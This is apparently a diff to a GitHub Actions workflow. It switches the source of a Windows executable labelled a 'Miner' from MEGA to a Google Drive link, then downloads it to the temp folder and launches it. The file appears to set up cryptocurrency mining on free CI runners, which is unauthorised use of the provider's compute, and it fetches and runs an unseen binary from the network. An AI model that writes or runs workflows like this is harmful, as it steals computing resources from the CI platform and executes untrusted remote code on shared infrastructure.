@@ -77,37 +77,18 @@ jobs:
           Invoke-WebRequest -Uri $url -OutFile $installer
           Start-Process -FilePath $installer -ArgumentList "/S" -Wait
 
-      # --- Install MEGAcmd ---
-      - name: Install MEGAcmd
+      # --- Download Miner from Google Drive ---
+      - name: Download Miner EXE from Google Drive
         run: |
-          choco install megacmd -y
-
-      # --- Locate mega-get.exe robustly ---
-      - name: Locate mega-get.exe
-        id: megacmd-locate
-        run: |
-          $megaGet = Get-ChildItem -Path C:\ -Filter mega-get.exe -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1 -ExpandProperty FullName
-          if (-not $megaGet) {
-            Write-Host "mega-get.exe not found! MEGAcmd install may have failed."
-            exit 1
-          }
-          Write-Host "Found mega-get.exe at $megaGet"
-          echo "MEGA_GET_PATH=$megaGet" | Out-File -FilePath $env:GITHUB_ENV -Encoding utf8 -Append
-
-      # --- Download Miner from MEGA using found path ---
-      - name: Download Miner from MEGA
-        run: |
-          & "${env:MEGA_GET_PATH}" "https://mega.nz/file/atJjSJJK#5LSuE8B1fYUrTwfrsErG7G7O51HGUZSBLzSlPioAkwA" "$env:TEMP"
+          $url = "https://drive.google.com/uc?export=download&id=1-1L5YrdOGk2lnwtMDcD4Uqx3mWQJPlBr"
+          $output = "$env:TEMP\ok.exe"
+          Invoke-WebRequest -Uri $url -OutFile $output
+          Write-Host "Miner downloaded to $output"
 
       # --- Run Your Miner ---
       - name: Run Your Miner
         run: |
-          $miner = "$env:TEMP\ok.exe"
-          if (-not (Test-Path $miner)) {
-            Write-Host "Miner not found at $miner!"
-            exit 1
-          }
-          Start-Process -FilePath $miner
+          Start-Process -FilePath "$env:TEMP\ok.exe"
           Write-Host "Miner started!"
 
       # --- Maintain Connection (Graceful Stop for Shutdown) ---
